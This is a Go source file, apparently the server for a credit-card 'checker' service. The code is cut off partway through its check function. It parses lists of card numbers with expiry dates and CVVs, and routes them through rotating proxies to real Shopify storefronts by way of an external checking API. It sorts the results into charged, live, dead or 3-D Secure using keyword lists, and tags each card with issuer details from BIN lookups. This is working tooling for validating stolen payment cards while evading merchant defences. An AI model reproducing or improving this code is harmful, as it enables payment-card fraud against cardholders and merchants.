package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"database/sql"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"math/rand"
	"mime/multipart"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	_ "github.com/lib/pq"
	"github.com/gorilla/websocket"
)

const (
	DATA_DIR     = "data"
	SITES_FILE   = "data/sites.json"
	PROXIES_FILE = "data/proxies.json"
)

var DEFAULT_SHOPIFY_SITES = []string{
	"https://reston-lloyd.myshopify.com",
	"https://favorstoday.com",
	"https://happyhentreats.com",
	"https://shop.yorkspacesystems.com",
	"https://davids-toothpaste.myshopify.com",
}

type Card struct {
	CC        string `json:"cc"`
	MM        string `json:"mm"`
	YY        string `json:"yy"`
	CVV       string `json:"cvv"`
	Formatted string `json:"formatted"`
}

type CheckResult struct {
	Status      string `json:"status"`
	Msg         string `json:"msg"`
	Emoji       string `json:"emoji"`
	Price       string `json:"price"`
	Gateway     string `json:"gateway"`
	Site        string `json:"site"`
	ReceiptID   string `json:"receipt_id"`
	Time        string `json:"time"`
	Card        string `json:"card"`
	BinBrand    string `json:"bin_brand,omitempty"`
	BinType     string `json:"bin_type,omitempty"`
	BinClass    string `json:"bin_class,omitempty"`
	BinBank     string `json:"bin_bank,omitempty"`
	BinCountry  string `json:"bin_country,omitempty"`
}

type ProxyStats struct {
	URL             string
	Latency         time.Duration
	ContinuousFails int
	BannedUntil     time.Time
	TotalSuccess    int
	TotalFails      int
}

type ProxyManager struct {
	mu    sync.RWMutex
	stats map[string]*ProxyStats
}

var (
	proxyManagerInstance *ProxyManager
	proxyManagerOnce     sync.Once
)

func GetProxyManager() *ProxyManager {
	proxyManagerOnce.Do(func() {
		proxyManagerInstance = &ProxyManager{
			stats: make(map[string]*ProxyStats),
		}
	})
	return proxyManagerInstance
}

func (pm *ProxyManager) RecordResult(proxy string, latency time.Duration, success bool) {
	if proxy == "" {
		return
	}
	pm.mu.Lock()
	defer pm.mu.Unlock()

	s, exists := pm.stats[proxy]
	if !exists {
		s = &ProxyStats{URL: proxy}
		pm.stats[proxy] = s
	}

	if success {
		s.TotalSuccess++
		s.ContinuousFails = 0
		if s.Latency == 0 {
			s.Latency = latency
		} else {
			s.Latency = (s.Latency*7 + latency*3) / 10
		}
	} else {
		s.TotalFails++
		s.ContinuousFails++
		if s.ContinuousFails >= 3 {
			s.BannedUntil = time.Now().Add(10 * time.Minute)
		}
	}
}

func (pm *ProxyManager) PickProxy(proxies []string) string {
	if len(proxies) == 0 {
		return ""
	}

	pm.mu.RLock()
	defer pm.mu.RUnlock()

	now := time.Now()
	var candidates []*ProxyStats
	var fallback []*ProxyStats

	for _, p := range proxies {
		s, exists := pm.stats[p]
		if !exists {
			candidates = append(candidates, &ProxyStats{URL: p})
			continue
		}

		if s.BannedUntil.After(now) {
			fallback = append(fallback, s)
			continue
		}
		candidates = append(candidates, s)
	}

	if len(candidates) == 0 {
		if len(fallback) > 0 {
			sort.Slice(fallback, func(i, j int) bool {
				return fallback[i].BannedUntil.Before(fallback[j].BannedUntil)
			})
			return fallback[0].URL
		}
		return proxies[rand.Intn(len(proxies))]
	}

	sort.Slice(candidates, func(i, j int) bool {
		latI := candidates[i].Latency
		if latI == 0 {
			latI = 1500 * time.Millisecond
		}
		latJ := candidates[j].Latency
		if latJ == 0 {
			latJ = 1500 * time.Millisecond
		}
		return latI < latJ
	})

	topN := len(candidates)
	if topN > 5 {
		topN = 5
	}
	idx := rand.Intn(topN)
	return candidates[idx].URL
}

type BinInfo struct {
	Brand   string `json:"brand"`
	Type    string `json:"type"`
	Class   string `json:"class"`
	Bank    string `json:"bank"`
	Country string `json:"country"`
}

var (
	payflowLockedUntil   time.Time
	payflowLockMu        sync.RWMutex
	payflowUserCooldown  = make(map[int64]time.Time)
	payflowCooldownMu    sync.Mutex

	binCache   = make(map[string]*BinInfo)
	binCacheMu sync.RWMutex
)

func getBinNumber(cardFormatted string) string {
	parts := strings.Split(cardFormatted, "|")
	if len(parts) == 0 {
		return ""
	}
	cc := strings.TrimSpace(parts[0])
	cc = strings.ReplaceAll(cc, " ", "")
	if len(cc) >= 8 {
		return cc[:8]
	}
	if len(cc) >= 6 {
		return cc[:6]
	}
	return ""
}

func fetchBinInfo(bin string) (*BinInfo, error) {
	if len(bin) < 6 {
		return nil, errors.New("invalid bin length")
	}
	bin = bin[:6]

	binCacheMu.RLock()
	if info, exists := binCache[bin]; exists {
		binCacheMu.RUnlock()
		return info, nil
	}
	binCacheMu.RUnlock()

	var info *BinInfo
	var err error

	info, err = tryStormX(bin)
	if err == nil && info != nil {
		saveToBinCache(bin, info)
		return info, nil
	}

	info, err = tryBinListNet(bin)
	if err == nil && info != nil {
		saveToBinCache(bin, info)
		return info, nil
	}

	info, err = tryBinListIo(bin)
	if err == nil && info != nil {
		saveToBinCache(bin, info)
		return info, nil
	}

	info, err = tryHandyAPI(bin)
	if err == nil && info != nil {
		saveToBinCache(bin, info)
		return info, nil
	}

	info, err = tryVoidex(bin)
	if err == nil && info != nil {
		saveToBinCache(bin, info)
		return info, nil
	}

	fallbackBrand, fallbackType := getLocalBinGuess(bin)
	info = &BinInfo{
		Brand:   fallbackBrand,
		Type:    fallbackType,
		Class:   "Unknown",
		Bank:    "Unknown Bank",
		Country: "Unknown Country",
	}
	saveToBinCache(bin, info)
	return info, nil
}

func saveToBinCache(bin string, info *BinInfo) {
	binCacheMu.Lock()
	binCache[bin] = info
	binCacheMu.Unlock()
}

func tryStormX(bin string) (*BinInfo, error) {
	client := &http.Client{Timeout: 3 * time.Second}
	resp, err := client.Get("https://stormxdark.tech/api/bin/" + bin)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("status %d", resp.StatusCode)
	}
	var data struct {
		Brand   string `json:"brand"`
		Type    string `json:"type"`
		Class   string `json:"class"`
		Bank    string `json:"bank"`
		Country string `json:"country"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&data); err != nil {
		return nil, err
	}
	return &BinInfo{
		Brand:   strings.ToUpper(data.Brand),
		Type:    strings.ToUpper(data.Type),
		Class:   data.Class,
		Bank:    data.Bank,
		Country: data.Country,
	}, nil
}

func tryBinListNet(bin string) (*BinInfo, error) {
	client := &http.Client{Timeout: 3 * time.Second}
	req, err := http.NewRequest("GET", "https://lookup.binlist.net/"+bin, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Accept-Version", "3")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("status %d", resp.StatusCode)
	}

	var data struct {
		Scheme  string `json:"scheme"`
		Type    string `json:"type"`
		Brand   string `json:"brand"`
		Country struct {
			Name string `json:"name"`
		} `json:"country"`
		Bank struct {
			Name string `json:"name"`
		} `json:"bank"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&data); err != nil {
		return nil, err
	}

	brand := data.Scheme
	if data.Brand != "" {
		brand = data.Brand
	}
	class := "Classic"
	if strings.Contains(strings.ToLower(brand), "gold") {
		class = "Gold"
	} else if strings.Contains(strings.ToLower(brand), "platinum") {
		class = "Platinum"
	} else if strings.Contains(strings.ToLower(brand), "signature") {
		class = "Signature"
	}

	return &BinInfo{
		Brand:   strings.ToUpper(brand),
		Type:    strings.ToUpper(data.Type),
		Class:   class,
		Bank:    data.Bank.Name,
		Country: data.Country.Name,
	}, nil
}

func tryBinListIo(bin string) (*BinInfo, error) {
	client := &http.Client{Timeout: 3 * time.Second}
	resp, err := client.Get("https://api.binlist.io/" + bin)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("status %d", resp.StatusCode)
	}
	var data struct {
		Scheme  string `json:"scheme"`
		Type    string `json:"type"`
		Brand   string `json:"brand"`
		Country struct {
			Name string `json:"name"`
		} `json:"country"`
		Bank struct {
			Name string `json:"name"`
		} `json:"bank"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&data); err != nil {
		return nil, err
	}
	brand := data.Scheme
	if data.Brand != "" {
		brand = data.Brand
	}
	return &BinInfo{
		Brand:   strings.ToUpper(brand),
		Type:    strings.ToUpper(data.Type),
		Class:   "Unknown",
		Bank:    data.Bank.Name,
		Country: data.Country.Name,
	}, nil
}

func tryHandyAPI(bin string) (*BinInfo, error) {
	client := &http.Client{Timeout: 3 * time.Second}
	resp, err := client.Get("https://data.handyapi.com/bin/" + bin)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("status %d", resp.StatusCode)
	}
	var data struct {
		Status  string `json:"Status"`
		Scheme  string `json:"Scheme"`
		Type    string `json:"Type"`
		Brand   string `json:"Brand"`
		Country struct {
			Name string `json:"Name"`
		} `json:"Country"`
		Bank struct {
			Name string `json:"Name"`
		} `json:"Bank"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&data); err != nil {
		return nil, err
	}
	if strings.ToLower(data.Status) == "fail" {
		return nil, errors.New("handyapi failed to find bin")
	}
	brand := data.Scheme
	if data.Brand != "" {
		brand = data.Brand
	}
	return &BinInfo{
		Brand:   strings.ToUpper(brand),
		Type:    strings.ToUpper(data.Type),
		Class:   "Unknown",
		Bank:    data.Bank.Name,
		Country: data.Country.Name,
	}, nil
}

func tryVoidex(bin string) (*BinInfo, error) {
	client := &http.Client{Timeout: 3 * time.Second}
	resp, err := client.Get("https://api.voidex.tech/bin/" + bin)
	if err != nil {
		resp, err = client.Get("https://voidex.org/api/bin/" + bin)
		if err != nil {
			return nil, err
		}
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("status %d", resp.StatusCode)
	}
	var data struct {
		Brand   string `json:"brand"`
		Type    string `json:"type"`
		Class   string `json:"class"`
		Bank    string `json:"bank"`
		Country string `json:"country"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&data); err != nil {
		return nil, err
	}
	return &BinInfo{
		Brand:   strings.ToUpper(data.Brand),
		Type:    strings.ToUpper(data.Type),
		Class:   data.Class,
		Bank:    data.Bank,
		Country: data.Country,
	}, nil
}

func getLocalBinGuess(bin string) (brand string, cardType string) {
	if len(bin) == 0 {
		return "UNKNOWN", "UNKNOWN"
	}
	firstDigit := bin[0]
	switch firstDigit {
	case '4':
		return "VISA", "DEBIT/CREDIT"
	case '5':
		return "MASTERCARD", "DEBIT/CREDIT"
	case '3':
		if len(bin) >= 2 && (bin[1] == '4' || bin[1] == '7') {
			return "AMEX", "CREDIT"
		}
		return "JCB", "CREDIT"
	case '6':
		return "DISCOVER", "CREDIT"
	}
	return "UNKNOWN", "UNKNOWN"
}

func testProxy(proxyRaw string) (time.Duration, error) {
	proxyConverted := formatProxyForAPI(proxyRaw)
	if proxyConverted == "" {
		return 0, errors.New("empty proxy")
	}

	proxyURLStr := "http://" + proxyConverted
	if !strings.HasPrefix(proxyConverted, "http://") && !strings.HasPrefix(proxyConverted, "https://") {
		proxyURLStr = "http://" + proxyConverted
	} else {
		proxyURLStr = proxyConverted
	}

	proxyURL, err := url.Parse(proxyURLStr)
	if err != nil {
		return 0, fmt.Errorf("invalid proxy URL: %v", err)
	}

	transport := &http.Transport{
		Proxy: http.ProxyURL(proxyURL),
		DialContext: (&net.Dialer{
			Timeout:   5 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		TLSHandshakeTimeout: 5 * time.Second,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   7 * time.Second,
	}

	start := time.Now()
	req, err := http.NewRequest("GET", "https://httpbin.org/ip", nil)
	if err != nil {
		return 0, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	resp, err := client.Do(req)
	if err != nil {
		req2, err2 := http.NewRequest("GET", "https://www.shopify.com", nil)
		if err2 != nil {
			return 0, err
		}
		req2.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
		start = time.Now()
		resp2, err2 := client.Do(req2)
		if err2 != nil {
			return 0, err2
		}
		defer resp2.Body.Close()
		return time.Since(start), nil
	}
	defer resp.Body.Close()
	return time.Since(start), nil
}

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
}

type WSClient struct {
	conn   *websocket.Conn
	userID int64
}

var (
	wsClients   = make(map[*WSClient]bool)
	wsClientsMu sync.Mutex
)

func broadcastTaskUpdate(userID int64, taskUpdate interface{}) {
	wsClientsMu.Lock()
	defer wsClientsMu.Unlock()

	payload, err := json.Marshal(taskUpdate)
	if err != nil {
		return
	}

	for client := range wsClients {
		if client.userID == userID {
			_ = client.conn.WriteMessage(websocket.TextMessage, payload)
		}
	}
}

func wsHandler(w http.ResponseWriter, r *http.Request) {
	session := getSession(r)
	if session == nil {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}
	userVal, ok := session["user"]
	if !ok {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}
	var userID int64
	switch v := userVal.(type) {
	case float64:
		userID = int64(v)
	case string:
		if id, err := strconv.ParseInt(v, 10, 64); err == nil {
			userID = id
		}
	}
	if userID == 0 {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("WebSocket upgrade failed:", err)
		return
	}

	client := &WSClient{conn: conn, userID: userID}
	wsClientsMu.Lock()
	wsClients[client] = true
	wsClientsMu.Unlock()

	defer func() {
		wsClientsMu.Lock()
		delete(wsClients, client)
		wsClientsMu.Unlock()
		conn.Close()
	}()

	for {
		_, _, err := conn.ReadMessage()
		if err != nil {
			break
		}
	}
}

var (
	db             *sql.DB
	dbSitesCache   []string
	dbProxiesCache []string
	dbCacheTime    time.Time
	dbCacheMu      sync.RWMutex
	dbCacheTTL     = 5 * time.Minute

	recentSites      = make([]string, 0, 50)
	recentSitesMu    sync.Mutex
	recentProxies    = make([]string, 0, 50)
	recentProxiesMu  sync.Mutex

	fileLock sync.Mutex
	proxyModifyMu sync.Mutex

	cardReg1 = regexp.MustCompile(`(\d{13,19})\s*[|/]\s*(\d{1,2})\s*[|/]\s*(\d{2,4})\s*[|/]\s*(\d{3,4})`)
	cardReg2 = regexp.MustCompile(`(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})`)

	chargedKeywords = []string{
		"charged", "charge success", "charge_success",
		"order complete", "order_complete", "order completed", "order_completed",
		"order confirmed", "order_confirmed",
		"order placed", "order_placed",
		"thank you", "thankyou", "thank_you",
		"captured", "capture_succeeded", "capture succeeded",
		"paid", "settled", "succeeded",
		"payment successful", "payment_successful", "payment success",
		"payment complete", "payment_complete", "payment_completed",
		"purchase complete", "purchase_complete",
		"transaction approved", "transaction_approved", "transaction successful",
		"transaction_successful",
		"sale approved", "sale_approved",
		"cnb", "amount_charged",
	}

	fraudKeywords      = []string{"fraud", "fraudulent", "high risk", "high_risk", "risk_review", "risk review", "suspicious", "do_not_honor", "do not honor", "pickup_card", "pickup card", "lost_card", "lost card", "stolen_card", "stolen card"}
	liveKeywords       = []string{"cvv", "ccn", "avs", "security code", "incorrect cvc", "incorrect_cvc", "cvc mismatch", "cvc_mismatch", "cvv mismatch", "cvv_mismatch", "avs mismatch", "avs_mismatch", "address mismatch", "address_mismatch", "zip code", "postal code", "billing address mismatch", "billing_address_mismatch"}
	lowBalanceKeywords = []string{"insufficient", "low balance", "low_balance", "funds", "not enough", "limit exceeded", "credit limit"}
	otpKeywords        = []string{"otp", "3d secure", "3d_secure", "3ds", "three_d_secure", "authentication required", "authentication_required", "requires_action", "requires action", "payer_action", "payer action", "payer_action_required", "redirect_to_3ds", "challenge", "vbv", "securecode", "sca_required", "sca required", "three d secure"}
	webErrorKeywords   = []string{
		"web_error", "shopify_web_error", "site_error", "gateway_error",
		"bad_request", "server_error", "internal_error", "temporarily_unavailable",
		"maintenance", "under_construction", "try_again_later",
		"detected_http", "detected_http_", "detected_bot", "bot_detected", "captcha",
		"cloudflare", "challenge_platform", "cf_chl", "js_challenge",
		"access_denied", "forbidden", "rate_limit", "too_many_requests",
		"waf", "firewall",
	}
	deadKeywords   = []string{"declined", "dead", "invalid", "failed", "rejected", "card declined", "card_declined", "generic decline", "generic_decline"}
	expiryKeywords = []string{
		"expired", "expiry", "expiration", "invalid month", "invalid year",
		"invalid date", "card expired", "card exp", "bad expiry", "bad expiration",
		"month invalid", "year invalid", "exp date", "exp month", "exp year",
	}
	noRetryStatuses = map[string]bool{
		"CHARGED":      true,
		"FRAUD":        true,
		"LIVE":         true,
		"DEAD":         true,
		"LOW_BALANCE":  true,
		"OTP_REQUIRED": true,
	}
)

func loadDotEnv() {
	file, err := os.Open(".env")
	if err != nil {
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		parts := strings.SplitN(line, "=", 2)
		if len(parts) == 2 {
			k := strings.TrimSpace(parts[0])
			v := strings.TrimSpace(parts[1])
			if strings.HasPrefix(v, "\"") && strings.HasSuffix(v, "\"") {
				v = v[1 : len(v)-1]
			}
			if strings.HasPrefix(v, "'") && strings.HasSuffix(v, "'") {
				v = v[1 : len(v)-1]
			}
			os.Setenv(k, v)
		}
	}
}

func initDB() {
	dbURL := os.Getenv("DATABASE_URL")
	if dbURL == "" {
		log.Println("DATABASE_URL is empty. Database connection skipped.")
		return
	}
	var err error
	db, err = sql.Open("postgres", dbURL)
	if err != nil {
		log.Println("DB connection failed:", err)
		db = nil
		return
	}

	db.SetMaxOpenConns(20)
	db.SetMaxIdleConns(2)
	db.SetConnMaxLifetime(3 * time.Minute)

	if err := db.Ping(); err != nil {
		log.Println("DB ping failed:", err)
		db.Close()
		db = nil
		return
	}

	_, err = db.Exec(`
		CREATE TABLE IF NOT EXISTS sites (
			id SERIAL PRIMARY KEY,
			url TEXT UNIQUE NOT NULL
		);
		CREATE TABLE IF NOT EXISTS proxies (
			id SERIAL PRIMARY KEY,
			proxy TEXT UNIQUE NOT NULL
		);
		CREATE TABLE IF NOT EXISTS web_login_tokens (
			token TEXT PRIMARY KEY,
			user_id BIGINT NOT NULL,
			username TEXT,
			first_name TEXT,
			expiry TIMESTAMP WITH TIME ZONE NOT NULL
		);
		CREATE TABLE IF NOT EXISTS check_tasks (
			id SERIAL PRIMARY KEY,
			user_id BIGINT NOT NULL,
			status TEXT NOT NULL,
			total_cards INT NOT NULL,
			checked_cards INT NOT NULL DEFAULT 0,
			results JSONB NOT NULL DEFAULT '[]'::jsonb,
			created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
			updated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
			telegram_sent BOOLEAN DEFAULT FALSE,
			result_file_path TEXT
		);
	`)
	if err != nil {
		log.Println("DB table creation failed:", err)
	} else {
		// Clean up any tasks left in 'running' state from previous server run
		_, errClean := db.Exec("UPDATE check_tasks SET status = 'failed', updated_at = CURRENT_TIMESTAMP WHERE status = 'running'")
		if errClean != nil {
			log.Println("Failed to clean up running tasks on startup:", errClean)
		} else {
			log.Println("Cleaned up stale running tasks successfully.")
		}
	}
}

func getSessionUser(r *http.Request) (int64, string, bool) {
	sessionData := getSession(r)
	if sessionData == nil {
		return 0, "", false
	}
	
	var uID int64
	if val := sessionData["user_id"]; val != nil {
		switch v := val.(type) {
		case float64:
			uID = int64(v)
		case int64:
			uID = v
		case int:
			uID = int64(v)
		}
	}
	
	var user string
	if val := sessionData["user"]; val != nil {
		if s, ok := val.(string); ok {
			user = s
		}
	}
	
	var admin bool
	if val := sessionData["admin"]; val != nil {
		if b, ok := val.(bool); ok {
			admin = b
		}
	}
	
	return uID, user, admin
}

func getSitesFromDB(userID int64, isAdmin bool) []string {
	if db == nil {
		return DEFAULT_SHOPIFY_SITES
	}

	if isAdmin || userID == 6071715158 {
		rows, err := db.Query("SELECT DISTINCT url FROM sites ORDER BY url")
		if err != nil {
			log.Println("DB query failed for global sites:", err)
			return DEFAULT_SHOPIFY_SITES
		}
		defer rows.Close()

		var sites []string
		for rows.Next() {
			var u string
			if err := rows.Scan(&u); err == nil && u != "" {
				sites = append(sites, u)
			}
		}
		if len(sites) == 0 {
			return DEFAULT_SHOPIFY_SITES
		}
		return sites
	}

	var privateSitesJSON []byte
	err := db.QueryRow("SELECT private_sites FROM users WHERE user_id = $1", userID).Scan(&privateSitesJSON)
	if err != nil {
		if err != sql.ErrNoRows {
			log.Println("DB query failed for private_sites:", err)
		}
		return DEFAULT_SHOPIFY_SITES
	}

	if len(privateSitesJSON) == 0 || string(privateSitesJSON) == "null" {
		return DEFAULT_SHOPIFY_SITES
	}

	var sites []string
	if err := json.Unmarshal(privateSitesJSON, &sites); err != nil {
		log.Println("JSON unmarshal failed for private_sites:", err)
		return DEFAULT_SHOPIFY_SITES
	}

	if len(sites) == 0 {
		return DEFAULT_SHOPIFY_SITES
	}
	return sites
}

func getProxiesFromDB(userID int64, isAdmin bool) []string {
	if db == nil {
		return nil
	}

	if isAdmin || userID == 6071715158 {
		rows, err := db.Query("SELECT DISTINCT proxy FROM proxies ORDER BY proxy")
		if err != nil {
			log.Println("DB query failed for global proxies:", err)
			return nil
		}
		defer rows.Close()

		var proxies []string
		for rows.Next() {
			var p string
			if err := rows.Scan(&p); err == nil && p != "" {
				proxies = append(proxies, p)
			}
		}
		return proxies
	}

	var privateProxiesJSON []byte
	err := db.QueryRow("SELECT private_proxies FROM users WHERE user_id = $1", userID).Scan(&privateProxiesJSON)
	if err != nil {
		if err != sql.ErrNoRows {
			log.Println("DB query failed for private_proxies:", err)
		}
		return nil
	}

	if len(privateProxiesJSON) == 0 || string(privateProxiesJSON) == "null" {
		return nil
	}

	var proxies []string
	if err := json.Unmarshal(privateProxiesJSON, &proxies); err != nil {
		log.Println("JSON unmarshal failed for private_proxies:", err)
		return nil
	}

	return proxies
}

func loadFile(path string) []string {
	fileLock.Lock()
	defer fileLock.Unlock()
	file, err := os.Open(path)
	if err != nil {
		return nil
	}
	defer file.Close()
	var data []string
	if err := json.NewDecoder(file).Decode(&data); err != nil {
		return nil
	}
	return data
}

func saveFile(path string, data []string) {
	fileLock.Lock()
	defer fileLock.Unlock()
	file, err := os.Create(path)
	if err != nil {
		log.Println("Failed to create file:", err)
		return
	}
	defer file.Close()
	json.NewEncoder(file).Encode(data)
}

func getSites(userID int64, isAdmin bool) []string {
	dbSites := getSitesFromDB(userID, isAdmin)
	fileSites := loadFile(SITES_FILE)

	seen := make(map[string]bool)
	var combined []string
	for _, s := range dbSites {
		if s != "" && !seen[s] {
			seen[s] = true
			combined = append(combined, s)
		}
	}
	for _, s := range fileSites {
		if s != "" && !seen[s] {
			seen[s] = true
			combined = append(combined, s)
		}
	}
	if len(combined) == 0 {
		return append([]string(nil), DEFAULT_SHOPIFY_SITES...)
	}
	return combined
}

func getProxies(userID int64, isAdmin bool) []string {
	dbProxies := getProxiesFromDB(userID, isAdmin)
	fileProxies := loadFile(PROXIES_FILE)

	seen := make(map[string]bool)
	var combined []string
	for _, p := range dbProxies {
		if p != "" && !seen[p] {
			seen[p] = true
			combined = append(combined, p)
		}
	}
	for _, p := range fileProxies {
		if p != "" && !seen[p] {
			seen[p] = true
			combined = append(combined, p)
		}
	}
	return combined
}

func pickRandomSite(sites []string) string {
	if len(sites) == 0 {
		return ""
	}
	recentSitesMu.Lock()
	defer recentSitesMu.Unlock()

	var available []string
	for _, s := range sites {
		recent := false
		for _, r := range recentSites {
			if r == s {
				recent = true
				break
			}
		}
		if !recent {
			available = append(available, s)
		}
	}

	if len(available) == 0 {
		recentSites = nil
		available = sites
	}

	choice := available[rand.Intn(len(available))]
	recentSites = append(recentSites, choice)
	if len(recentSites) > 50 {
		recentSites = recentSites[1:]
	}
	return choice
}

func pickRandomProxy(proxies []string) string {
	if len(proxies) == 0 {
		return ""
	}
	recentProxiesMu.Lock()
	defer recentProxiesMu.Unlock()

	var available []string
	for _, p := range proxies {
		recent := false
		for _, r := range recentProxies {
			if r == p {
				recent = true
				break
			}
		}
		if !recent {
			available = append(available, p)
		}
	}

	if len(available) == 0 {
		recentProxies = nil
		available = proxies
	}

	choice := available[rand.Intn(len(available))]
	recentProxies = append(recentProxies, choice)
	if len(recentProxies) > 50 {
		recentProxies = recentProxies[1:]
	}
	return choice
}

func formatProxyForAPI(proxyRaw string) string {
	clean := strings.TrimSpace(proxyRaw)
	if clean == "" {
		return ""
	}
	if strings.Contains(clean, "://") {
		parts := strings.SplitN(clean, "://", 2)
		clean = parts[1]
	}
	if strings.Contains(clean, "@") {
		return clean
	}
	parts := strings.Split(clean, ":")
	if len(parts) == 4 {
		ip, port, user, passwd := parts[0], parts[1], parts[2], parts[3]
		return fmt.Sprintf("%s:%s@%s:%s", user, passwd, ip, port)
	}
	return clean
}

func parseCards(text string) []Card {
	var cards []Card
	lines := strings.Split(text, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		line = regexp.MustCompile(`\s+`).ReplaceAllString(line, " ")

		if m := cardReg1.FindStringSubmatch(line); m != nil {
			cc := m[1]
			mm := fmt.Sprintf("%02s", m[2])
			if len(mm) > 2 {
				mm = mm[len(mm)-2:]
			}
			yy := m[3]
			if len(yy) > 2 {
				yy = yy[len(yy)-2:]
			}
			cvv := m[4]
			cards = append(cards, Card{
				CC:        cc,
				MM:        mm,
				YY:        yy,
				CVV:       cvv,
				Formatted: fmt.Sprintf("%s|%s|%s|%s", cc, mm, yy, cvv),
			})
			continue
		}

		if m := cardReg2.FindStringSubmatch(line); m != nil {
			cc := m[1]
			mm := fmt.Sprintf("%02s", m[2])
			if len(mm) > 2 {
				mm = mm[len(mm)-2:]
			}
			yy := m[3]
			if len(yy) > 2 {
				yy = yy[len(yy)-2:]
			}
			cvv := m[4]
			cards = append(cards, Card{
				CC:        cc,
				MM:        mm,
				YY:        yy,
				CVV:       cvv,
				Formatted: fmt.Sprintf("%s|%s|%s|%s", cc, mm, yy, cvv),
			})
		}
	}
	return cards
}

func classifyResponse(apiResponse string) (string, string) {
	raw := strings.ToLower(strings.TrimSpace(apiResponse))
	combined := strings.ReplaceAll(strings.ReplaceAll(raw, "_", " "), "-", " ")

	for _, k := range chargedKeywords {
		if strings.Contains(combined, k) {
			return "CHARGED", "🔥"
		}
	}
	for _, k := range fraudKeywords {
		if strings.Contains(raw, k) {
			return "FRAUD", "⚠️"
		}
	}
	for _, k := range liveKeywords {
		if strings.Contains(raw, k) {
			return "LIVE", "✅"
		}
	}
	for _, k := range lowBalanceKeywords {
		if strings.Contains(raw, k) {
			return "LOW_BALANCE", "🎆"
		}
	}
	for _, k := range otpKeywords {
		if strings.Contains(raw, k) {
			return "OTP_REQUIRED", "✅"
		}
	}

	if strings.Contains(combined, "approved") || strings.Contains(combined, "authorized") || strings.Contains(combined, "authorised") {
		if !strings.Contains(combined, "not approved") && !strings.Contains(combined, "unapproved") && !strings.Contains(combined, "not authorized") && !strings.Contains(combined, "declined") {
			return "LIVE", "✅"
		}
	}

	for _, k := range webErrorKeywords {
		if strings.Contains(raw, k) {
			return "ERROR", "⚠️"
		}
	}
	for _, k := range deadKeywords {
		if strings.Contains(raw, k) {
			return "DEAD", "❌"
		}
	}
	if strings.Contains(raw, "error") {
		return "ERROR", "⚠️"
	}
	return "UNKNOWN", "⚠️"
}

func isExpiryError(msg string) bool {
	m := strings.ToLower(msg)
	for _, k := range expiryKeywords {
		if strings.Contains(m, k) {
			return true
		}
	}
	return false
}

func doCheck(client *http.Client, sacAPI string, card Card, site string, proxyRaw string) CheckResult {
	cc := card.Formatted
	proxyConverted := formatProxyForAPI(proxyRaw)

	urlStr := fmt.Sprintf("%s/mlsn?cc=%s&site=%s", sacAPI, url.QueryEscape(cc), url.QueryEscape(site))
	if proxyConverted != "" {
		urlStr += fmt.Sprintf("&proxy=%s", url.QueryEscape(proxyConverted))
	}

	req, err := http.NewRequest("GET", urlStr, nil)
	if err != nil {
		return CheckResult{Status: "ERROR", Msg: err.Error(), Emoji: "⚠️", Price: "-", Gateway: "Shopify", Site: site, ReceiptID: "N/A"}
	}

	resp, err := client.Do(req)
	if err != nil {
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			return CheckResult{Status: "TIMEOUT", Msg: "Request Timeout (90s)", Emoji: "⏰", Price: "-", Gateway: "Shopify", Site: site, ReceiptID: "N/A"}
		}
		return CheckResult{Status: "EXCEPTION", Msg: err.Error(), Emoji: "🔥", Price: "-", Gateway: "Shopify", Site: site, ReceiptID: "N/A"}
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return CheckResult{Status: "ERROR", Msg: err.Error(), Emoji: "⚠️", Price: "-", Gateway: "Shopify", Site: site, ReceiptID: "N/A"}
	}

	var raw map[string]interface{}
	if err := json.Unmarshal(bodyBytes, &raw); err != nil {
		text := string(bodyBytes)
		text = regexp.MustCompile(`<[^>]+>`).ReplaceAllString(text, "")
		text = strings.TrimSpace(text)
		if len(text) > 200 {
			text = text[:200]
		}
		return CheckResult{Status: "ERROR", Msg: text, Emoji: "⚠️", Price: "-", Gateway: "Shopify", Site: site, ReceiptID: "N/A"}
	}

